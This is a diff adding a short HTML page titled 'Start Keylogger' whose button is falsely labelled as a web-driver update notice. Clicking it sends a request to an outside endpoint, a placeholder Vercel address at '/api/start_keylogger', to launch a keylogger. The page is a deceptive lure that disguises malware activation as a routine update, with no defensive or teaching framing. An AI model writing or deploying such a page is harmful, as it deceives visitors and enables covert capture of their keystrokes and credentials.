@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Start Keylogger</title>
+</head>
+<body>
+
+<h2>Click the button below to start the keylogger:</h2>
+
+<button onclick="startKeylogger()">Your Web Drivers are out of date. Use the link below to update</button>
+
+<script>
+function startKeylogger() {
+    var url = 'https://your-vercel-project.vercel.app/api/start_keylogger';
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, true);
+    xhr.send();
+}
+</script>
+
+</body>
+</html>
